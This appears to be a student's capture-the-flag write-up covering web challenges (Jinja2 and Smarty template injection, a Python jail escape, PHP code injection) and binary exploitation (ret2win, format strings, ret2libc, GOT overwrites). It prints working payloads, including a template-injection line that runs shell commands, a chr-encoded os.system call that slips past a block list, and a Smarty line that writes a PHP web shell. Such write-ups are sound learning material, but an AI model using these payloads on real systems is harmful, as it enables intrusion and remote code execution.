>Web Challenges

    Forty-nine

    After leaking the source code:
    I found out that the actual vulnerable line was:
    [  return render_template('index.html',error=Environment().from_string(input).render())    ]

    Here we can see that it loads a new Jinja object or template from a string then renders it. In Jinja 2, there are these following rules:
    block_start_string - {%, block end string - %}
    variable start string - {{, variabkle end string - }}
    comment start string - {#, comment end string - #}.
    But these settings can be changed, these are only the defaults

    Some example jinja2 code you can find in app.py in the forty-nine directory.

    Since {{ is blacklisted, we can try {% but this is a block, which means it's not gonna give you output normally, because it just constitues the logic, like an if or something else.
    So we have to use the print statement to get output from {%%}, which means leveraging mro's in python to get to popen .
    To get it to render, we can only print to get some output.!!!

    We can identify that the server is in python and from the task description we can assume it's gonna be some kind of SSTI.
    In python - 2 template escapes exist:
        {{ }}    or     {% %}
    Leveraging python objects and MRO (method resolution order):
    {% print( ''.__class__.__mro__[1].__subclasses__()) %}
    What this does in python is :
    __class__ - returns the class of '' => <class 'string'>
    __mro__ - returns the class, and the classes from which that class has inherited. In python, every class inherits form the base class object!!!
    The order of the classes is : class, parent classes.
    The first parent class is gonna be object, and then we enumerate it's subclasses, basically enumerating every class that that python program has.

    In there we look for popen, or system, or anything that can get us into the shell. We found popen, we look for it's position - 367

    Then we use that to cat the flag
    Popen('ls -l',shell=True,stdout=-1).communicate()
    stdout = -1 indicates that the stdout to belong to popen for later use, like communicate() which is used to interact with popen.

    So this is the final payload:
    {% print( ''.__class__.__mro__[1].__subclasses__()[367]("cat flag.txt",shell=True,stdout=-1).communicate()[0]) %}


___________________________________________________________

    Code Transpiler

    A classic challange that needs you to escape a python jail and has a block-list of banned words and commands.

    The most basic instruction/solution is :
    print(exec('import os; os.system("ls")'))
    but it seems that some keywords are blacklisted...

    We try to add '' blank chars in between or to split the keywords.
    print(exec('impo'+'rt o'+'s; o'+'s.sy'+'stem("l'+'s")'))
    or 
    print(exec('im''port o''s; o''s.sys''tem("ca''t fl''ag")'))
    Both work. and we are done.

    ALTERNATIVE SOLUTIONS:
    use __import__("os").system("cat flag"), but eliminate ANY suspicion or words!
    take each character and find its ascii value and then convert to ascii with chr.
    
    Like this:   
    exec(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(111)+chr(115)+chr(34)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(34)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(34)+chr(41))

___________________________________________________________

    Boze

    This challenge involves the smarty php template engine, and we are given the source code.

    We can actually see the errors in the /tmp/smarty_exception.log file, if we give that as a parameter to content.

    About smarty we have to know that the display function is called for a template file, like 'index.tpl', so without a template file, it's gonna give an error that is vulnerable to SSTI injections.

    We are gonna try the ?content = {$smarty.version}, and then ?content = /tmp/smarty_exception.log to see that a version like '23.2' is displayed in the error.

    Then we can try to use the fetch method to "read" the data from the file.

    ?content={fetch file='flag.php'}

    then

    ?content=/tmp/smarty_exception.log 

    But I saw that when I tried to do {system('ls')} or anything like that it didn't let me to then get the contents of the exception log!

    For Smarty, there is also this useful command injection:
    {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
    This command would overwrite our script specified in $SCRIPT_NAME with the php code with passthru which gives us remote code execution, and also clears any configurations! But this didn't work here.

____________________________________________________________________


    nsort
    The final payload: 
    http://34.159.182.195:31598/?poc=[]);}}%20print_r(file(%22flag.php%22));//


    We see that it says missing poc. So we try the pos get parameter ?pos= something.

    We also use the hints in the task names, such as nsort, which means that we are refering to some sort of sorting algorithm, which works with... ARRAYS ...
    So we add poc = []. This gives us an empty response on the webpage meaning it went through without errors. Now we try to close parantheses and put a new ; so that we can input additional commands.

    We first try '[]//' but then it gives an error. So we then comment out the rest of the instruction and we construct the correct payload from error messages.

    It first says "Unclosed ( " so we add ) to the payload
    Then it gives us "Unclose { " so we add } to the payload
    Then we are missing a semicolon before the closed }.
    Then we are missing another }.
    So our payload so far is []);}}//
    From here on we can add whatever instructions we want, such as reading the contes of the file flag.php and output the response with print_r or echo.


    By first checking phpinfo(), you can check which functions are disabled, so here we can see that exec, readfile, file_get_contents and a lot of os functions are not permitted for us. So then we have to look for functions that are enabled that can read from file.

____________________________________________________________________
>pwn challenges

    Baby-bof

    This was just a basic ret2win buffer overflow challenge, which used the function gets that is vulnerable. To solve this I opened the program in gdb-pwndbg, created a cyclic pattern and then inputed that cyclic pattern and analised what bytes got into the rsp or rip at the moment of the crash, because that should be where the return adress from the function should be. So then we gave it an offset determined earlier and added the address of the "flag" function, which then prints out the flag.

____________________________________________________________________
    System leak

    I didn't get the hint from the task description and I thought about leaking stuff with format vulnerabilities, but not that the flag might be on the stack, WHICH it is!

    The vulnerability that is evident is the fact that our input gets passed directly to [syslog]. What is great about this is that [syslog] uses a format string as its second argument. So we have a | format string vulnerability | .

    So to solve this, just create a fuzzing script which prints out the string located at the memory address indicated by the n-th element of the stack.(%n$s).

    What I thought the solution might be was to override the syslog function with the system function in the GOT. But this cannot be done because the executable has FULL RELRO enabled, which makes the GOT read only!!! So we cannot write there!!! 

____________________________________________________________________

    Bistro

    This seems to be just a buffer overflow with gets, but with no function to return to. So we gotta return to libc somehow.
    To do this, we need to know the version of libc that the server is running so we need to leak a function like puts, we could even do puts(puts). Since this is a 64 bytes elf file, we need to pop the got of puts into rdi, then call puts.

    Then with the leaked address, go to libc database search webiste and find out which version of libc it might be, download them on your local computer, and then :
    -- load the libc as an elf file in the script
    -- set libc.address = leaked_printf - offset_in_libc(printf)
    -- then make a r = ROP(libc) object
    -- then you can call r.execve(next(libc.search('/bin/sh\x00')))

    LIBC has both system, and execve(3 args) - rop.execve(next(libc.search(b"/bin/sh\x00")),0,0)

    For system, you have to align the stack to the 16 byte calling convetion

    '''In Linux, GCC sets the de facto standard for calling conventions. Since GCC version 4.5, the stack must be aligned to a 16-byte boundary when calling a function (previous versions only required a 4-byte alignment).'''


____________________________________________________________________

    BistroV2
    
    We need to find out the secret code to enter the bistr, which is on the stack.
    So we run a fuzzing script with the first few positions and analyse which element on the stack got us into the bistro. In our case it was the 9th element.

    Then we use the same exploit but we just have to add this code to make sure we get into the bistro every time.

____________________________________________________________________

    Book

    For this challenge, a new pwn vulnerability was used: (which I struggled to find for a long time)
    [ Access to unchecked indexes ]
    This happened in the print note entry and store not entry which allowed read and write operations even to negative indexes.
    THe indexes indicate inside the todos list, but with todos[a + i*0x30], with i negative you can check out not intende functions, like GOT.

    FOr some reason, the decompiler only worder in gef, so here we added a first item, for key 0, the elements 'AAAA', which were then used to locate the start of the todos list.

    gef> search-pattern 'AAAA'
    Then from there we printed out some hex values/addresses before the pattern, which would give us some got functions.
    We find that at -4 the value you find is the open libc function, and even if the PIE is enabled, we are going to determined based on the version the offset between the system and the atoi function, and then we add todo with 2 dwords, one with the leak, and one with the new value system to override atoi function.
    Then BOOM! You;re in!

____________________________________________________________________

    Syslog-Write -- hard

    This challenge was very time consuming, I had to brush up on my pwn skills a lot.
    For this challenge, locally it works pretty easy pretty fast.
    There are 2 vulnerabilities in the code, the first is the format string vulnerability found in the syslog function, since the 2nd argument should be a format specifier, but we are passing our input; and then the 2nd vulnerability is a buffer overflow when entering the value for the LOG_LEVEL(a buffer of 10 bytes).

    We can see that PIE is disabled, which means predictable addresses, which don't change, and that we have partial RELRO, meaning we can override the GOT functions.

    As this follows, we will use a format string vulnerability to overwrite the fgets function, with system, then at the next fgets, which asks for our input at option 1, we will have to put 10 bytes of dummy text and then put the argument that will get into system, which is '/bin/sh'. 

    The Harder part would be to do it remotely, since we have to find a way to get back to libc base address. We would need a fuzzing script to get a lot of addresses from the stack, and then find an address which points to a libc function, find the libc version online, then download that version of libc and load it into the exploit script, setting it's base address accordingly to be able to call function from it.